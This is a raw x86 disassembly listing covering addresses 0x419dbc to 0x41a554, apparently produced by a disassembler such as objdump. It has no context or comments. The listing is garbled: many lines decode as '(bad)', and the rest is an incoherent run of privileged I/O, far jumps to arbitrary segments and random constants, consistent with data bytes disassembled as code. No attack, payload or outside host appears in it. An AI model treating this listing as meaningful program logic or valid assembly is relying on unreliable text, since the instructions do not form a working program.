  419dbc:	xlat   BYTE PTR ds:[ebx]
  419dbd:	bound  edx,QWORD PTR [eax+0x72c0c3d6]
  419dc3:	mov    al,ds:0xbdddab00
  419dc8:	div    eax
  419dca:	and    DWORD PTR [ebp-0xdb9b981],ebx
  419dd0:	out    dx,eax
  419dd1:	rcl    DWORD PTR [ecx-0x18],1
  419dd4:	jp     0x419dc7
  419dd6:	jmp    0x57bcea98
  419ddb:	ret    
  419ddc:	(bad)  
  419ddd:	mov    ecx,0x8a9c3ace
  419de2:	add    al,0x4a
  419de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419de5:	sbb    eax,0x64cc206
  419dea:	cmp    BYTE PTR [esp+ebp*2],dl
  419ded:	sahf   
  419dee:	fdivr  st(1),st
  419df0:	pop    es
  419df1:	(bad)  
  419df2:	dec    ecx
  419df3:	test   bh,al
  419df5:	mov    edi,DWORD PTR [esi-0x19892316]
  419dfb:	js     0x419dac
  419dfd:	repz loopne 0x419dd4
  419e00:	ds sbb eax,0xd9533b3c
  419e06:	(bad)  
  419e07:	cli    
  419e08:	mov    ah,0xd3
  419e0a:	cmp    cl,BYTE PTR [esi]
  419e0c:	cmp    esi,eax
  419e0e:	nop
  419e0f:	fsub   QWORD PTR [ebp+0x7c]
  419e12:	dec    ebx
  419e13:	mov    ebp,0x165c78a3
  419e18:	stos   DWORD PTR es:[edi],eax
  419e19:	sub    BYTE PTR [eax+ecx*1+0x5e8e572e],0x74
  419e21:	loope  0x419dbb
  419e23:	pusha  
  419e24:	fldcw  WORD PTR [edx]
  419e26:	push   ds
  419e27:	pop    esp
  419e28:	imul   edx,DWORD PTR [edi+edi*8-0x28],0x62
  419e2d:	add    DWORD PTR [eax],ecx
  419e2f:	jbe    0x419e72
  419e31:	and    DWORD PTR [esi],edx
  419e33:	mov    eax,ds:0x9226324b
  419e38:	out    dx,eax
  419e39:	mov    esp,0xc3b4480a
  419e3e:	shl    BYTE PTR [edi+eiz*4],1
  419e41:	call   DWORD PTR [edx+0x6]
  419e44:	fwait
  419e45:	inc    edi
  419e46:	enter  0x552,0xc1
  419e4a:	ss jmp 0xd357:0xa316e6e1
  419e52:	push   0xbffc9071
  419e57:	push   0xffffffce
  419e59:	sub    DWORD PTR [edx-0x7],0xffffffa1
  419e5d:	jl     0x419de5
  419e5f:	push   cs
  419e60:	xchg   ch,cl
  419e62:	jl     0x419e1a
  419e64:	shl    ah,1
  419e66:	ja     0x419edf
  419e68:	(bad)  
  419e6a:	nop
  419e6b:	daa    
  419e6c:	sub    bl,BYTE PTR [ebp+0x1f]
  419e6f:	xchg   esp,eax
  419e70:	jle    0x419e64
  419e72:	(bad)  
  419e73:	pop    esp
  419e74:	ins    DWORD PTR es:[edi],dx
  419e75:	popf   
  419e76:	mov    bh,0x61
  419e78:	pop    es
  419e79:	fbld   TBYTE PTR [ecx+0x6c]
  419e7c:	jnp    0x419e52
  419e7e:	test   al,0x4d
  419e80:	or     eax,0xd05ec994
  419e85:	arpl   WORD PTR [ebx*4-0x1807454],sp
  419e8c:	xor    al,0x88
  419e8e:	add    DWORD PTR [ebx+0x5f],eax
  419e91:	pop    edi
  419e92:	xor    BYTE PTR [ecx],0xf7
  419e95:	(bad)  
  419e96:	push   ebp
  419e97:	jne    0x419e46
  419e99:	and    BYTE PTR [ebx-0x3ee7ddb4],dl
  419e9f:	xlat   BYTE PTR ds:[ebx]
  419ea0:	call   0x88dc847f
  419ea5:	std    
  419ea6:	mov    DWORD PTR ds:0x3d9a6ab,eax
  419eac:	dec    edi
  419ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419eae:	xor    bh,BYTE PTR [edi-0x1821d246]
  419eb4:	push   ecx
  419eb5:	add    ecx,DWORD PTR [ecx+0x49]
  419eb8:	test   al,0xe9
  419eba:	add    al,BYTE PTR [ebx+edi*2]
  419ebd:	add    esp,DWORD PTR [edx-0x2b105d49]
  419ec3:	push   edx
  419ec4:	pop    ds
  419ec5:	mov    ah,0x8f
  419ec7:	or     cl,BYTE PTR [esi-0xb0b38a2]
  419ecd:	mov    edx,0x7326ef8
  419ed2:	sbb    eax,0xb39faee8
  419ed7:	test   DWORD PTR [esi+0x2f4c7006],ebx
  419edd:	or     edx,edx
  419edf:	adc    bh,dl
  419ee1:	fadd   QWORD PTR [eax-0x12]
  419ee4:	out    0x9b,al
  419ee6:	aam    0x71
  419ee8:	std    
  419ee9:	cdq    
  419eea:	jbe    0x419e83
  419eec:	sbb    DWORD PTR [esi],ebx
  419eee:	jp     0x419ecc
  419ef0:	fstp   TBYTE PTR [esi+0x6977efc]
  419ef6:	and    edi,DWORD PTR [esi+0x6337ecdd]
  419efc:	shl    DWORD PTR [ecx-0x30],1
  419eff:	xor    esi,DWORD PTR [edi+edi*8+0x2c005826]
  419f06:	dec    esp
  419f07:	jne    0x419eb2
  419f09:	adc    eax,0xbf3e0540
  419f0e:	in     eax,dx
  419f0f:	add    eax,0xf75a7bdb
  419f14:	push   0xffffffcf
  419f16:	inc    esi
  419f17:	mov    ecx,0xaa4dc41
  419f1c:	pop    DWORD PTR [edi+0x2]
  419f1f:	ins    BYTE PTR es:[edi],dx
  419f20:	lds    edx,FWORD PTR [edx+ebp*8-0x3adddf50]
  419f27:	dec    edi
  419f28:	push   ecx
  419f29:	jo     0x419f27
  419f2b:	sbb    ch,BYTE PTR [ebp-0x222ada50]
  419f31:	mov    dh,dl
  419f33:	test   BYTE PTR [ecx+0x6b],dl
  419f36:	clc    
  419f37:	mov    dh,0x7c
  419f39:	test   eax,0xf8cd5bbb
  419f3e:	hlt    
  419f3f:	mov    ah,0x5
  419f41:	pop    edx
  419f42:	sub    DWORD PTR [ecx],ebx
  419f44:	ret    0x6226
  419f47:	in     al,dx
  419f48:	add    BYTE PTR [ecx],dl
  419f4a:	cs in  eax,0xc0
  419f4d:	rsqrtps xmm2,XMMWORD PTR [esi]
  419f50:	xchg   DWORD PTR [esi-0x265aad04],esp
  419f56:	scas   al,BYTE PTR es:[edi]
  419f57:	pop    es
  419f58:	pop    esp
  419f59:	js     0x419edc
  419f5b:	(bad)  
  419f5d:	cld    
  419f5e:	js     0x419fc2
  419f60:	xor    eax,0x91220aba
  419f65:	fistp  WORD PTR [ecx]
  419f67:	cmp    BYTE PTR [ebx+0x1a52ed7f],bl
  419f6d:	xor    eax,0xd36ecd3
  419f72:	fisttp WORD PTR [eax+0x7d0b9479]
  419f78:	data16 outs dx,BYTE PTR ds:[esi]
  419f7a:	mov    ss,WORD PTR [eax+0xd810c59]
  419f80:	popf   
  419f81:	in     eax,dx
  419f82:	xchg   ebx,eax
  419f83:	sub    edi,esi
  419f85:	ror    DWORD PTR [ebx-0x34],cl
  419f88:	dec    edx
  419f89:	pop    ds
  419f8a:	xor    BYTE PTR [edx],0x94
  419f8d:	ficomp WORD PTR [edi+0x4a168038]
  419f93:	out    dx,eax
  419f94:	mov    BYTE PTR [edi+0x2d5d73b6],ch
  419f9a:	(bad)
  419f9d:	dec    esp
  419f9e:	mov    al,ds:0x7b206813
  419fa3:	into   
  419fa4:	test   eax,0xbf67cfe4
  419fa9:	or     BYTE PTR [ecx+0x10],0x3b
  419fad:	mov    dl,0x4c
  419faf:	xchg   edx,eax
  419fb0:	xchg   ebp,eax
  419fb1:	aaa    
  419fb2:	or     al,0xdd
  419fb4:	adc    BYTE PTR [eax+0x33],al
  419fb7:	sar    BYTE PTR [edi],0xc9
  419fba:	aaa    
  419fbb:	ret    
  419fbc:	sub    eax,0xff76adb8
  419fc1:	mov    ch,BYTE PTR [ebx-0x47]
  419fc4:	scas   al,BYTE PTR es:[edi]
  419fc5:	push   esi
  419fc6:	push   es
  419fc7:	and    al,0xe5
  419fc9:	dec    ebx
  419fca:	xchg   esp,eax
  419fcb:	js     0x419feb
  419fcd:	lea    edx,[edi+0x51a581da]
  419fd3:	xlat   BYTE PTR ds:[ebx]
  419fd4:	jmp    0xcf8504b5
  419fd9:	arpl   WORD PTR [edx-0x60],cx
  419fdc:	inc    esi
  419fdd:	iret   
  419fde:	mov    ds:0x3af89dc9,al
  419fe3:	inc    ebx
  419fe4:	adc    BYTE PTR [edx],ah
  419fe6:	push   edi
  419fe7:	mov    ecx,DWORD PTR [ecx+0x67d7481e]
  419fed:	(bad)  
  419fee:	jmp    0xab5d:0x29e7c472
  419ff5:	dec    esi
  419ff6:	mov    esi,DWORD PTR [ecx]
  419ff8:	rcr    ch,0xce
  419ffb:	frstor [edx-0x16]
  419ffe:	ficom  DWORD PTR [edx+0x507345a3]
  41a004:	xor    bh,BYTE PTR [esi+0x4c]
  41a007:	outs   dx,DWORD PTR ds:[esi]
  41a008:	xchg   BYTE PTR [ebx-0x63b4e0fc],dl
  41a00e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a00f:	outs   dx,DWORD PTR ds:[esi]
  41a010:	cmp    eax,0x2208ed5a
  41a015:	xchg   edi,eax
  41a016:	pop    ss
  41a017:	jp     0x41a044
  41a019:	lock xchg edi,eax
  41a01b:	ret    
  41a01c:	je     0x41a03a
  41a01e:	(bad)  
  41a01f:	and    cl,cl
  41a021:	xor    esi,edx
  41a023:	inc    edx
  41a024:	mov    ds,WORD PTR [eax+0x563d47b8]
  41a02a:	ja     0x41a01f
  41a02c:	mov    esi,0x8e35f7aa
  41a031:	cmp    DWORD PTR [edi+ecx*4+0x7c70f7df],esi
  41a038:	mov    eax,ds:0x12fd73c5
  41a03d:	sbb    DWORD PTR [ebx+ecx*1],edi
  41a040:	mov    edx,0x95408040
  41a045:	(bad)  
  41a046:	or     al,0x52
  41a048:	sub    eax,0xc5e6df9e
  41a04d:	fadd   QWORD PTR [eax+0x5]
  41a050:	mov    ?,WORD PTR [esi]
  41a052:	call   0x9a4e:0x2757e78
  41a059:	out    dx,al
  41a05a:	mov    ecx,0x3dc95956
  41a05f:	xchg   ecx,eax
  41a060:	sub    eax,0xebf1e953
  41a065:	call   DWORD PTR [esi-0x42b74829]
  41a06b:	dec    edx
  41a06c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a06d:	xor    bh,dl
  41a06f:	dec    ecx
  41a070:	jle    0x41a03b
  41a072:	mov    cl,0xa9
  41a074:	les    ecx,FWORD PTR [esi+0x70]
  41a077:	jp     0x41a058
  41a079:	xor    edi,DWORD PTR [edx]
  41a07b:	std    
  41a07c:	ins    DWORD PTR es:[edi],dx
  41a07d:	nop
  41a07e:	xchg   ebx,eax
  41a07f:	je     0x41a044
  41a081:	mov    dh,0x2b
  41a083:	xlat   BYTE PTR ds:[ebx]
  41a084:	cwde   
  41a085:	lds    esi,FWORD PTR [ecx]
  41a087:	jnp    0x41a0a0
  41a089:	sub    BYTE PTR [esi+0xd],ch
  41a08c:	xchg   edx,eax
  41a08d:	or     DWORD PTR [edx],ebx
  41a08f:	sbb    al,0xc9
  41a091:	and    DWORD PTR [esp+ebx*2-0x15],eax
  41a095:	aas    
  41a096:	outs   dx,BYTE PTR ds:[esi]
  41a097:	xor    al,0xd4
  41a099:	loopne 0x41a063
  41a09b:	adc    al,0xc0
  41a09d:	cwde   
  41a09e:	ret    
  41a09f:	xchg   DWORD PTR es:[ecx],ebp
  41a0a2:	gs mov bh,0xb6
  41a0a5:	push   edi
  41a0a6:	xchg   edx,eax
  41a0a7:	gs nop
  41a0a9:	mov    ss,WORD PTR [ecx+0x44]
  41a0ac:	sbb    esp,DWORD PTR [edi-0x571e57d1]
  41a0b2:	push   es
  41a0b3:	pop    ds
  41a0b4:	adc    edx,ebp
  41a0b6:	clc    
  41a0b7:	mov    al,es:0xfedf4911
  41a0bd:	mov    dh,0x6d
  41a0bf:	pop    ebx
  41a0c0:	fwait
  41a0c1:	mov    edi,0x8fb98d5c
  41a0c6:	mov    eax,ds:0xa1e18822
  41a0cb:	das    
  41a0cc:	jbe    0x41a070
  41a0ce:	in     al,0x6
  41a0d0:	lea    ecx,[edx-0x5bcff3fe]
  41a0d6:	pop    esp
  41a0d7:	stc    
  41a0d8:	and    dl,BYTE PTR [edi+0x7b3f8fb8]
  41a0de:	data16 fs jo 0x41a0b9
  41a0e2:	push   ecx
  41a0e3:	mov    bl,0xb3
  41a0e5:	and    esp,DWORD PTR [ebx+edi*1]
  41a0e8:	gs call 0x311986f4
  41a0ee:	jle    0x41a0fe
  41a0f0:	add    cl,bl
  41a0f2:	idiv   BYTE PTR ds:0x4a8f8858
  41a0f8:	pop    edi
  41a0f9:	outs   dx,DWORD PTR ds:[esi]
  41a0fa:	js     0x41a0a3
  41a0fc:	aas    
  41a0fd:	push   ss
  41a0fe:	movups xmm2,XMMWORD PTR [esi]
  41a101:	lock xor BYTE PTR [edx-0x5a485ea3],cl
  41a108:	cmp    al,0xbe
  41a10a:	ins    DWORD PTR es:[edi],dx
  41a10b:	add    DWORD PTR [ecx+0x559d60f7],ebx
  41a111:	mov    bh,0xc5
  41a113:	pop    ebx
  41a114:	fcom   QWORD PTR [ebx-0x72]
  41a117:	fwait
  41a118:	sbb    DWORD PTR [esi-0x80],0xfb77aa16
  41a11f:	jmp    0xa995:0x3602dc7d
  41a126:	inc    edi
  41a127:	pushf  
  41a128:	cmp    esp,DWORD PTR [ebx-0x30cbde0e]
  41a12e:	cmp    BYTE PTR [ebp+0x463b2634],al
  41a134:	fadd   DWORD PTR [edx]
  41a136:	sbb    al,al
  41a138:	jb     0x41a138
  41a13a:	in     al,0x46
  41a13c:	adc    BYTE PTR [edi-0x24d5234d],dh
  41a142:	xor    ecx,DWORD PTR [edx-0x24]
  41a145:	ret    
  41a146:	je     0x41a1b5
  41a148:	loope  0x41a127
  41a14a:	neg    DWORD PTR [ebp+0x17]
  41a14d:	into   
  41a14e:	ins    BYTE PTR es:[edi],dx
  41a14f:	cmp    al,0xd8
  41a151:	pushf  
  41a152:	in     eax,0xe
  41a154:	cmc    
  41a155:	pop    ss
  41a156:	dec    esi
  41a157:	aad    0xb9
  41a159:	into   
  41a15a:	sub    eax,0x4f4e0e8
  41a15f:	imul   esi,edi,0x21ffa93c
  41a165:	jns    0x41a1e5
  41a167:	ja     0x41a0f4
  41a169:	call   0x9fbf6516
  41a16e:	lds    ecx,FWORD PTR [ecx+0x1287d7f0]
  41a174:	lahf   
  41a175:	lods   al,BYTE PTR ds:[esi]
  41a176:	mov    BYTE PTR [edx+ecx*8+0x65],0x40
  41a17b:	rcr    BYTE PTR [esi],1
  41a17d:	daa    
  41a17e:	fdiv   QWORD PTR [eax-0x51]
  41a181:	xor    BYTE PTR [ebp+0x6cab04d7],bl
  41a187:	mov    ebx,0xb0a797fb
  41a18c:	sti    
  41a18d:	pop    es
  41a18e:	inc    esp
  41a18f:	inc    eax
  41a190:	sub    BYTE PTR ds:0x1decd3a,ah
  41a196:	cwde   
  41a197:	scas   eax,DWORD PTR es:[edi]
  41a198:	(bad)  
  41a199:	(bad)  
  41a19a:	(bad)  
  41a19b:	mov    ebp,0x7dc3dda4
  41a1a0:	mov    ds:0xb37aa56f,al
  41a1a5:	cmp    eax,0xf46addac
  41a1aa:	xchg   BYTE PTR [esi+ecx*1],al
  41a1ad:	inc    eax
  41a1ae:	push   ecx
  41a1af:	push   ecx
  41a1b0:	jecxz  0x41a161
  41a1b2:	pop    ss
  41a1b3:	je     0x41a172
  41a1b5:	je     0x41a1f9
  41a1b7:	idiv   edx
  41a1b9:	or     al,0x9f
  41a1bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1bc:	xor    bh,BYTE PTR [edi]
  41a1be:	test   BYTE PTR [eax],cl
  41a1c0:	(bad)  
  41a1c2:	and    al,0x84
  41a1c4:	jb     0x41a241
  41a1c6:	imul   DWORD PTR [ebx]
  41a1c8:	cli    
  41a1c9:	mov    bl,0x55
  41a1cb:	inc    ecx
  41a1cc:	je     0x41a24c
  41a1ce:	mov    esp,0x78391e7a
  41a1d3:	push   esp
  41a1d4:	(bad)  
  41a1d6:	adc    dl,BYTE PTR es:[eax]
  41a1d9:	push   eax
  41a1da:	pop    ecx
  41a1db:	daa    
  41a1dc:	rcl    DWORD PTR [esi],cl
  41a1de:	pop    ebx
  41a1df:	and    bh,bh
  41a1e1:	push   cs
  41a1e2:	in     al,dx
  41a1e3:	add    DWORD PTR [eax],0x44517f0
  41a1e9:	xchg   DWORD PTR [ebp-0x14e5a452],esp
  41a1ef:	loopne 0x41a18f
  41a1f1:	push   ds
  41a1f2:	push   cs
  41a1f3:	push   esp
  41a1f4:	scas   eax,DWORD PTR es:[edi]
  41a1f5:	adc    BYTE PTR [ebp+0x74],ch
  41a1f8:	xchg   edx,eax
  41a1f9:	sahf   
  41a1fa:	sbb    al,0x93
  41a1fc:	dec    edx
  41a1fd:	out    0xfa,al
  41a1ff:	dec    edi
  41a200:	add    al,0x5
  41a202:	aas    
  41a203:	pusha  
  41a204:	jae    0x41a224
  41a206:	js     0x41a22c
  41a208:	sub    dh,al
  41a20a:	xchg   edx,eax
  41a20b:	inc    edi
  41a20c:	xor    bh,BYTE PTR [ebp-0x62]
  41a20f:	call   0x2258968a
  41a214:	xor    al,0x3b
  41a216:	out    0x88,eax
  41a218:	enter  0x8d83,0xb2
  41a21c:	sub    edx,DWORD PTR [eax+0x1f]
  41a21f:	ins    DWORD PTR es:[edi],dx
  41a220:	cmc    
  41a221:	outs   dx,DWORD PTR ds:[esi]
  41a222:	inc    ebp
  41a223:	lods   al,BYTE PTR ds:[esi]
  41a224:	lods   eax,DWORD PTR ds:[esi]
  41a225:	mov    bh,0xb8
  41a227:	cmp    esp,esi
  41a229:	shl    BYTE PTR [esi-0x6d],0x39
  41a22d:	mov    edi,0x5b270c5f
  41a232:	mov    WORD PTR [edx-0x23635ab],es
  41a238:	push   ss
  41a239:	pushf  
  41a23a:	dec    edx
  41a23b:	adc    eax,DWORD PTR ds:0x6fcfabb5
  41a241:	lods   al,BYTE PTR ds:[esi]
  41a242:	imul   ebp,DWORD PTR [edx-0x274a1191],0xffffffcc
  41a249:	or     al,0x7b
  41a24b:	out    0xfd,al
  41a24d:	or     al,0x67
  41a24f:	xchg   ebp,eax
  41a250:	sbb    esi,DWORD PTR [ecx-0x39]
  41a253:	or     DWORD PTR ds:0x54f479b0,ecx
  41a259:	sbb    bh,bl
  41a25b:	inc    esi
  41a25c:	add    BYTE PTR [eax+0x1d9239ca],al
  41a262:	nop
  41a263:	fstp   QWORD PTR [eax+0x7a141043]
  41a269:	cmp    BYTE PTR [edi+0x15],cl
  41a26c:	cmovle esp,DWORD PTR [eax-0x337f3eed]
  41a273:	outs   dx,DWORD PTR ds:[esi]
  41a274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a275:	scas   al,BYTE PTR es:[edi]
  41a276:	pusha  
  41a277:	retf   
  41a278:	in     eax,dx
  41a279:	sar    DWORD PTR [ebp+0x4b5f47f1],cl
  41a27f:	outs   dx,DWORD PTR ds:[esi]
  41a280:	sub    BYTE PTR [ecx],cl
  41a282:	daa    
  41a283:	sbb    BYTE PTR [ebx],0x80
  41a286:	dec    ecx
  41a287:	jecxz  0x41a291
  41a289:	mov    WORD PTR [esi-0x2444329f],fs
  41a28f:	in     al,0xba
  41a291:	xor    eax,0xbea403dd
  41a296:	ret    
  41a297:	adc    eax,0x1e3fd78e
  41a29c:	jae    0x41a22f
  41a29e:	std    
  41a29f:	int    0x29
  41a2a1:	cld    
  41a2a2:	pop    edi
  41a2a3:	inc    ecx
  41a2a4:	xchg   edi,eax
  41a2a5:	test   BYTE PTR [ebp+0x76],dl
  41a2a8:	lahf   
  41a2a9:	xor    DWORD PTR [edi-0x25],0xffffffe9
  41a2ad:	stc    
  41a2ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2af:	jp     0x41a325
  41a2b1:	sub    al,BYTE PTR [ebx-0x20]
  41a2b4:	mov    es,WORD PTR [ebp-0x26204436]
  41a2ba:	cld    
  41a2bb:	loopne 0x41a29d
  41a2bd:	loopne 0x41a31c
  41a2bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2c0:	dec    ebx
  41a2c1:	mov    ch,0x1e
  41a2c3:	loop   0x41a25f
  41a2c5:	(bad)  
  41a2c6:	call   0x4400:0xcd543704
  41a2cd:	shl    dl,cl
  41a2cf:	pop    esp
  41a2d0:	iret   
  41a2d1:	and    eax,0x2e531c29
  41a2d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2d7:	test   eax,0x7f0fd2ea
  41a2dc:	pop    es
  41a2dd:	add    DWORD PTR [ecx],ebx
  41a2df:	inc    edx
  41a2e0:	or     al,0x9f
  41a2e3:	sbb    eax,0xd16d0bc8
  41a2e8:	pop    edi
  41a2e9:	loopne 0x41a359
  41a2eb:	xchg   BYTE PTR [ebp+0x51117317],ch
  41a2f1:	xchg   ebp,eax
  41a2f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2f3:	scas   al,BYTE PTR es:[edi]
  41a2f4:	add    DWORD PTR [edx-0x40],ebp
  41a2f7:	jne    0x41a2c7
  41a2f9:	stos   BYTE PTR es:[edi],al
  41a2fa:	pusha  
  41a2fb:	and    BYTE PTR [ecx-0x2],dh
  41a2fe:	dec    ebx
  41a2ff:	in     al,0xa7
  41a301:	js     0x41a376
  41a303:	push   cs
  41a304:	hlt    
  41a305:	ins    BYTE PTR es:[edi],dx
  41a306:	in     al,dx
  41a307:	inc    esp
  41a308:	push   edx
  41a309:	xchg   DWORD PTR [eax],edx
  41a30b:	(bad)  
  41a30d:	div    DWORD PTR [esi-0x15]
  41a310:	sbb    DWORD PTR [esi],0xf6e0a2
  41a316:	push   es
  41a317:	(bad)  
  41a319:	add    eax,0x175f4be4
  41a31e:	push   ecx
  41a31f:	mov    edi,0x1adcbfe3
  41a324:	pop    ecx
  41a325:	fbld   TBYTE PTR [eax+0xe0b52e8]
  41a32b:	inc    ebx
  41a32c:	lahf   
  41a32d:	or     al,0x27
  41a32f:	fstp   TBYTE PTR [ebx-0x2e17ca0]
  41a335:	mov    DWORD PTR [edi-0x70],esi
  41a338:	pop    es
  41a339:	test   ecx,ebp
  41a33b:	cmp    esp,eax
  41a33d:	mov    ds:0x4c98070f,al
  41a342:	out    0xc6,al
  41a344:	lds    edi,FWORD PTR [ebx-0x69763ec3]
  41a34a:	call   0x9ecbe16e
  41a34f:	dec    edi
  41a350:	leave  
  41a351:	fisubr DWORD PTR [ecx+0x679d592f]
  41a357:	add    dh,BYTE PTR ds:0x30e3302b
  41a35d:	pop    eax
  41a35e:	ret    
  41a35f:	jmp    0x41a3cf
  41a361:	inc    edx
  41a362:	rcl    BYTE PTR [edx-0x8087077],cl
  41a368:	mov    cl,BYTE PTR [edi-0x6ab05ebd]
  41a36e:	inc    edx
  41a36f:	jmp    0xcedd1ce3
  41a374:	mov    esi,0x932867ed
  41a379:	sub    al,0xc6
  41a37b:	mov    ch,0x11
  41a37d:	mov    al,0x92
  41a37f:	lock ficom WORD PTR [ebp-0x2c]
  41a383:	in     eax,dx
  41a384:	(bad)  
  41a385:	mov    ecx,0x37322335
  41a38a:	xor    ebp,DWORD PTR [ebp+0x254939ea]
  41a390:	ja     0x41a35a
  41a392:	lahf   
  41a393:	and    al,0x2f
  41a395:	and    DWORD PTR [esi+0x2],ebx
  41a398:	es pop ss
  41a39a:	out    dx,al
  41a39b:	and    al,0x8
  41a39d:	or     dl,BYTE PTR [eax+edx*8+0x42]
  41a3a1:	jo     0x41a3d7
  41a3a3:	jl     0x41a3e5
  41a3a5:	add    bl,BYTE PTR [esi]
  41a3a7:	mov    al,ds:0x6391e0e1
  41a3ac:	jg     0x41a34f
  41a3ae:	mov    ds:0x48cae112,al
  41a3b3:	inc    esp
  41a3b4:	inc    esi
  41a3b5:	pop    ds
  41a3b6:	mov    bl,0x4a
  41a3b8:	pop    esp
  41a3b9:	xchg   dx,ax
  41a3bb:	xlat   BYTE PTR ds:[ebx]
  41a3bc:	jno    0x41a384
  41a3be:	jne    0x41a3c9
  41a3c0:	into   
  41a3c1:	retf   0x5979
  41a3c4:	adc    eax,0x852c21da
  41a3c9:	lds    edi,FWORD PTR [ebx+0x37]
  41a3cc:	push   esp
  41a3cd:	jmp    0xfc52:0x61a13890
  41a3d4:	test   al,0x1
  41a3d6:	jl     0x41a3ca
  41a3d8:	lds    eax,FWORD PTR [ebp+0x1d9100c2]
  41a3de:	add    esp,DWORD PTR [ecx+0x44]
  41a3e1:	call   0xd42b63b7
  41a3e6:	outs   dx,BYTE PTR ds:[esi]
  41a3e7:	int3   
  41a3e8:	add    dl,BYTE PTR [ebp+edi*2+0x1d]
  41a3ec:	enter  0x3b7c,0x9f
  41a3f0:	add    ebp,ecx
  41a3f2:	dec    esi
  41a3f3:	imul   ebx,DWORD PTR [eax+0x2fa38dbb],0x3de6b731
  41a3fd:	scas   al,BYTE PTR es:[edi]
  41a3fe:	test   edi,edx
  41a400:	sti    
  41a401:	jl     0x41a454
  41a403:	adc    al,0xc0
  41a405:	(bad)  [esi+0x57]
  41a408:	push   eax
  41a409:	sbb    BYTE PTR [eax+esi*2],al
  41a40c:	sbb    eax,0xf55bb1cd
  41a411:	sub    DWORD PTR [ebx],esp
  41a413:	and    eax,0x27e73cea
  41a418:	sar    BYTE PTR [esi+0x3cf65a8f],1
  41a41e:	or     eax,0x476ba792
  41a423:	nop
  41a424:	cmp    DWORD PTR [ebp+0x11],ecx
  41a427:	sub    ch,BYTE PTR [ebp-0x173ed280]
  41a42d:	test   ecx,eax
  41a42f:	cmp    BYTE PTR [esi-0x747c3a79],ah
  41a435:	xor    eax,0x7c1d4171
  41a43a:	js     0x41a41c
  41a43c:	out    dx,al
  41a43d:	ret    0x2101
  41a440:	xchg   ebp,eax
  41a441:	or     eax,0x69a6f9e8
  41a446:	adc    esi,DWORD PTR [ebx+0x57]
  41a449:	and    eax,0xea704c04
  41a44e:	mov    ds:0x6fcbd960,eax
  41a453:	push   es
  41a454:	xchg   edi,eax
  41a455:	sbb    eax,0xc96d0691
  41a45a:	xchg   ebx,eax
  41a45b:	sbb    eax,0x854d92e0
  41a460:	jecxz  0x41a3e9
  41a462:	mov    ds,WORD PTR [ebp-0x2479978e]
  41a468:	cmp    eax,0xea53986
  41a46d:	mov    al,ds:0x3ee0b76a
  41a472:	cmp    eax,0xece38c8d
  41a477:	xchg   esi,eax
  41a478:	js     0x41a3fb
  41a47a:	(bad)  
  41a47b:	and    eax,0x2d49926f
  41a480:	pop    ss
  41a481:	pop    es
  41a482:	in     al,dx
  41a483:	imul   ebx
  41a485:	or     DWORD PTR [ecx+0x44],ebx
  41a488:	mov    edi,0x22dc6fac
  41a48d:	pop    edx
  41a48e:	int    0x99
  41a490:	loope  0x41a462
  41a492:	cmp    cl,al
  41a494:	aas    
  41a495:	inc    edx
  41a496:	sbb    al,BYTE PTR [eax+0x6d]
  41a499:	in     eax,dx
  41a49a:	or     al,0x3f
  41a49c:	std    
  41a49d:	dec    esp
  41a49e:	mov    ebx,0x49cdf698
  41a4a3:	inc    eax
  41a4a4:	sbb    eax,0xee35e3ad
  41a4a9:	adc    dl,BYTE PTR [eax]
  41a4ab:	push   edi
  41a4ac:	test   BYTE PTR [edx-0x5c7497b],cl
  41a4b2:	retf   0xf7ce
  41a4b5:	jo     0x41a513
  41a4b7:	fs jno 0x41a47a
  41a4ba:	jnp    0x41a498
  41a4bc:	shr    BYTE PTR [esi-0x1e],cl
  41a4bf:	or     al,0x8b
  41a4c1:	jo     0x41a4e0
  41a4c3:	mov    dl,0xed
  41a4c5:	xlat   BYTE PTR ds:[ebx]
  41a4c6:	and    al,0x45
  41a4c8:	dec    edi
  41a4c9:	pop    ecx
  41a4ca:	hlt    
  41a4cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4cc:	outs   dx,DWORD PTR ds:[esi]
  41a4cd:	imul   esi,DWORD PTR [ebx-0x48],0x16
  41a4d1:	mov    edi,0x2c32607f
  41a4d6:	ret    
  41a4d7:	mov    ebx,0x2be8c60
  41a4dc:	into   
  41a4dd:	ins    DWORD PTR es:[edi],dx
  41a4de:	ret    0xdd27
  41a4e1:	icebp  
  41a4e2:	mov    ebp,0xe5412296
  41a4e7:	add    cl,BYTE PTR [ecx+eiz*1+0x4f1b7d7f]
  41a4ee:	jae    0x41a4aa
  41a4f0:	mov    dh,0xed
  41a4f2:	inc    ebx
  41a4f3:	call   0xb11e57e7
  41a4f8:	mov    al,ds:0x8fdf1d9
  41a4fd:	imul   ebp,edi,0xcc08cdc4
  41a503:	icebp  
  41a504:	shl    DWORD PTR [ecx+0x2c5f6f5f],0x52
  41a50b:	pushf  
  41a50c:	lock push es
  41a50e:	and    esi,edx
  41a510:	aas    
  41a511:	dec    esi
  41a512:	hlt    
  41a513:	test   DWORD PTR [eax+esi*1+0x7878505],0x17a94e7
  41a51e:	xchg   ecx,eax
  41a51f:	sbb    esi,edx
  41a521:	outs   dx,BYTE PTR ds:[esi]
  41a522:	daa    
  41a523:	add    eax,0x957457e6
  41a528:	mov    al,ds:0x1380e2d
  41a52d:	std    
  41a52e:	daa    
  41a52f:	add    edx,DWORD PTR [ecx]
  41a531:	mov    dl,0x76
  41a533:	psrld  mm6,0xfd
  41a537:	sahf   
  41a538:	shr    DWORD PTR [ebp+0x1407bc26],0x2d
  41a53f:	inc    esi
  41a540:	mov    ss,WORD PTR [ebx]
  41a542:	fs retf 
  41a544:	mov    bh,0x4f
  41a546:	xchg   ebx,eax
  41a547:	fst    QWORD PTR [ebx+ebp*4]
  41a54a:	jle    0x41a55b
  41a54c:	(bad)  
  41a54d:	mov    bh,0x91
  41a54f:	sti    
  41a550:	xor    dh,ch
  41a552:	and    edi,ecx
  41a554:	addr16 fst st(6)
